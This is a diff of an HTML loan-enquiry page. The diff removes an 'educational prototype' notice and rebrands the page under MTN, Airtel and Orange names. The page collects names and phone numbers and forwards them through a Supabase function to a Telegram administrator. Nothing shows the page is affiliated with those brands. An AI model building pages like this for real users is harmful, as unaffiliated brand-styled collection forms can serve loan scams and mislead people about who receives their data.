@@ -1,361 +1,250 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <title>MTN Loans Cameroon - Demo</title>
+  <meta name="description" content="Submit a loan application enquiry and request contact from our team.">
+  <title>MTN, Airtel & Orange Loan Applications</title>
 
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
+      padding: 24px 14px;
       font-family: Arial, sans-serif;
-      background: #f5f5f5;
-      color: #222;
-    }
-
-    .header {
-      background: #ffcc00;
-      padding: 22px 15px;
-      text-align: center;
-      border-bottom: 4px solid #222;
-    }
-
-    .header h1 {
-      margin: 0;
-      font-size: 28px;
-      font-weight: bold;
-    }
-
-    .header p {
-      margin: 6px 0 0;
-      font-size: 14px;
+      background: #f3f6fb;
+      color: #172033;
     }
 
     .container {
-      max-width: 600px;
+      max-width: 520px;
       margin: 25px auto;
-      padding: 0 15px;
-    }
-
-    .card {
+      padding: 28px 22px;
       background: white;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0 3px 12px rgba(0,0,0,0.12);
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.08);
     }
 
-    .notice {
-      background: #fff4c2;
-      border-left: 5px solid #ffcc00;
-      padding: 12px;
-      margin-bottom: 20px;
-      font-size: 13px;
-      line-height: 1.5;
-    }
+    h1 { font-size: 25px; margin-top: 0; }
+    .intro { color: #566176; line-height: 1.6; }
 
     label {
       display: block;
-      margin-top: 15px;
-      margin-bottom: 6px;
+      margin-top: 18px;
+      margin-bottom: 7px;
       font-weight: bold;
     }
 
-    input,
-    select,
+    input[type="text"],
+    input[type="tel"],
     textarea {
+      display: block;
       width: 100%;
       padding: 13px;
-      border: 1px solid #ccc;
-      border-radius: 7px;
-      font-size: 15px;
+      border: 1px solid #cbd3df;
+      border-radius: 8px;
+      font: inherit;
     }
 
-    textarea {
-      min-height: 90px;
-      resize: vertical;
+    textarea { min-height: 100px; resize: vertical; }
+
+    .consent {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      font-weight: normal;
+      line-height: 1.5;
     }
+
+    .consent input { margin-top: 4px; }
 
     button {
       width: 100%;
-      margin-top: 22px;
       padding: 14px;
-      border: none;
-      border-radius: 7px;
-      background: #ffcc00;
-      color: #111;
-      font-size: 17px;
+      margin-top: 22px;
+      border: 0;
+      border-radius: 8px;
+      background: #1769d2;
+      color: white;
+      font-size: 16px;
       font-weight: bold;
       cursor: pointer;
     }
 
-    button:hover {
-      background: #e6b800;
-    }
+    button:disabled { opacity: .6; cursor: wait; }
 
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-
-    #message {
-      display: none;
-      margin-top: 18px;
-      padding: 14px;
-      border-radius: 7px;
-      font-weight: bold;
+    #formMessage {
+      margin-top: 16px;
       line-height: 1.5;
+      overflow-wrap: anywhere;
     }
 
-    .success {
-      background: #d9f7df;
-      color: #176b2c;
+    .privacy {
+      margin-top: 20px;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #566176;
     }
 
-    .error {
-      background: #ffdede;
-      color: #9b1c1c;
-    }
-
-    .footer {
-      text-align: center;
-      font-size: 12px;
-      color: #666;
-      margin: 20px 0;
+    /* Hidden spam-trap field */
+    .website-field {
+      position: absolute;
+      left: -10000px;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
     }
   </style>
 </head>
 
 <body>
+  <main class="container">
+    <h1>Loan Application Enquiry</h1>
 
-  <div class="header">
-    <h1>MTN Loans Cameroon</h1>
-    <p>Educational Loan Application Prototype</p>
-  </div>
+    <p class="intro">
+      Use this form to request contact about loan services associated
+      with MTN, Airtel or Orange. Submitting an enquiry does not guarantee
+      approval or a loan offer.
+    </p>
 
-  <div class="container">
+    <form id="loanForm">
+      <label for="full_name">Full Name *</label>
+      <input
+        type="text"
+        id="full_name"
+        name="full_name"
+        maxlength="100"
+        autocomplete="name"
+        required
+      >
 
-    <div class="card">
+      <label for="phone">Phone Number *</label>
+      <input
+        type="tel"
+        id="phone"
+        name="phone"
+        maxlength="25"
+        autocomplete="tel"
+        required
+      >
 
-      <div class="notice">
-        <strong>Demo Notice:</strong>
-        This is an educational prototype. Please do not enter real
-        personal, financial, or identification information.
-      </div>
+      <label for="details">Additional Details (Optional)</label>
+      <textarea
+        id="details"
+        name="details"
+        maxlength="500"
+        placeholder="Optional information for your enquiry"
+      ></textarea>
 
-      <h2>Loan Application</h2>
-
-      <form id="loanForm">
-
-        <label for="full_name">Full Name</label>
+      <div class="website-field" aria-hidden="true">
+        <label for="website">Leave this field empty</label>
         <input
           type="text"
-          id="full_name"
-          placeholder="Example: Demo Applicant"
-          required
+          id="website"
+          name="website"
+          tabindex="-1"
+          autocomplete="off"
         >
+      </div>
 
-        <label for="phone">Phone Number</label>
-        <input
-          type="tel"
-          id="phone"
-          placeholder="Example: 690000000"
-          required
-        >
+      <label class="consent" for="consent">
+        <input type="checkbox" id="consent" required>
+        <span>
+          I agree that my name and phone number may be used to respond
+          to this enquiry. I understand that my details will be sent
+          to the service administrator through Telegram.
+        </span>
+      </label>
 
-        <label for="loan_amount">Loan Amount (FCFA)</label>
-        <input
-          type="number"
-          id="loan_amount"
-          min="5000"
-          max="500000"
-          placeholder="5000 - 500000"
-          required
-        >
+      <button type="submit" id="submitButton">
+        Submit Enquiry
+      </button>
 
-        <label for="repayment_period">Repayment Period</label>
-        <select id="repayment_period" required>
-          <option value="">Select period</option>
-          <option value="1">1 Month</option>
-          <option value="2">2 Months</option>
-          <option value="3">3 Months</option>
-          <option value="4">4 Months</option>
-          <option value="5">5 Months</option>
-          <option value="6">6 Months</option>
-        </select>
+      <p id="formMessage" role="status" aria-live="polite"></p>
+    </form>
 
-        <label for="loan_purpose">Loan Purpose</label>
-        <textarea
-          id="loan_purpose"
-          placeholder="Example: Educational demo"
-          required
-        ></textarea>
-
-        <button type="submit" id="submitButton">
-          Submit Application
-        </button>
-
-      </form>
-
-      <div id="message"></div>
-
-    </div>
-
-    <div class="footer">
-      MTN Loans Cameroon — Educational Prototype
-    </div>
-
-  </div>
-
-  <!-- Supabase library -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <p class="privacy">
+      Please provide only the information requested. Read the service's
+      privacy notice and loan terms before proceeding. Never send passwords,
+      PINs, verification codes or mobile-money account credentials.
+    </p>
+  </main>
 
   <script>
-
-    // YOUR SUPABASE PROJECT
     const SUPABASE_URL =
-      "https://onsrpuqiffzxhrjwagrz.supabase.co";
+      "https://fzxhrjwagrz.supabase.co";
 
-    // IMPORTANT:
-    // Paste your Supabase PUBLISHABLE key between the quotation marks below.
-    // Do NOT use a secret/service-role key here.
+    // Replace this placeholder with the existing publishable/anon key
+    // from the SAME Supabase project. Never use a secret/service-role key.
     const SUPABASE_KEY =
       "sb_publishable_X0YDa_Rknxmp3RVav9JHvg_DTh8qeOX";
 
-    const supabaseClient =
-      window.supabase.createClient(
-        SUPABASE_URL,
-        SUPABASE_KEY
-      );
-
-
     const form = document.getElementById("loanForm");
-    const message = document.getElementById("message");
-    const submitButton = document.getElementById("submitButton");
+    const message = document.getElementById("formMessage");
+    const button = document.getElementById("submitButton");
 
-
-    function showMessage(text, type) {
-      message.textContent = text;
-      message.className = type;
-      message.style.display = "block";
-    }
-
-
-    form.addEventListener("submit", async function(event) {
-
+    form.addEventListener("submit", async function (event) {
       event.preventDefault();
 
-      message.style.display = "none";
-
-      const fullName =
-        document.getElementById("full_name").value.trim();
-
-      const phone =
-        document.getElementById("phone").value.trim();
-
-      const loanAmount =
-        Number(document.getElementById("loan_amount").value);
-
-      const repaymentPeriod =
-        Number(document.getElementById("repayment_period").value);
-
-      const loanPurpose =
-        document.getElementById("loan_purpose").value.trim();
-
-
-      if (!fullName || !phone || !loanAmount ||
-          !repaymentPeriod || !loanPurpose) {
-
-        showMessage(
-          "Please complete all fields.",
-          "error"
-        );
-
+      if (
+        SUPABASE_KEY ===
+        "sb_publishable_X0YDa_Rknxmp3RVav9JHvg_DTh8qeOX"
+      ) {
+        message.textContent =
+          "Website setup is incomplete. Please try again later.";
         return;
       }
 
-
-      if (loanAmount < 5000 || loanAmount > 500000) {
-
-        showMessage(
-          "Loan amount must be between 5,000 and 500,000 FCFA.",
-          "error"
-        );
-
-        return;
-      }
-
-
-      submitButton.disabled = true;
-      submitButton.textContent = "Submitting...";
-
+      button.disabled = true;
+      message.textContent = "Submitting your enquiry...";
 
       try {
+        const response = await fetch(
+          SUPABASE_URL +
+            "/functions/v1/loan-application-notify",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "apikey": SUPABASE_KEY
+            },
+            body: JSON.stringify({
+              full_name:
+                document.getElementById("full_name").value.trim(),
+              phone:
+                document.getElementById("phone").value.trim(),
+              details:
+                document.getElementById("details").value.trim(),
+              website:
+                document.getElementById("website").value.trim(),
+              consent:
+                document.getElementById("consent").checked
+            })
+          }
+        );
 
-        const { data, error } =
-          await supabaseClient
-            .from("loan_applications")
-            .insert([
-              {
-                full_name: fullName,
-                phone: phone,
-                loan_amount: loanAmount,
-                repayment_period: repaymentPeriod,
-                loan_purpose: loanPurpose,
-                status: "pending"
-              }
-            ])
-            .select();
+        const result = await response.json();
 
-
-        if (error) {
-
-          console.error("Supabase error:", error);
-
-          showMessage(
-            "Submission failed: " + error.message,
-            "error"
+        if (!response.ok || !result.success) {
+          throw new Error(
+            result.error || "Your enquiry could not be submitted."
           );
-
-          return;
         }
 
-
-        console.log("Application saved:", data);
-
-
-        showMessage(
-          "Application submitted successfully. Status: Pending.",
-          "success"
-        );
-
+        message.textContent =
+          "Your enquiry was submitted successfully. Please wait for the team to contact you.";
 
         form.reset();
-
-
       } catch (error) {
-
-        console.error("Unexpected error:", error);
-
-        showMessage(
-          "Something went wrong. Please check your Supabase configuration.",
-          "error"
-        );
-
+        message.textContent =
+          error.message ||
+          "Unable to submit right now. Please try again later.";
       } finally {
-
-        submitButton.disabled = false;
-        submitButton.textContent = "Submit Application";
-
+        button.disabled = false;
       }
-
     });
-
   </script>
-
 </body>
 </html>
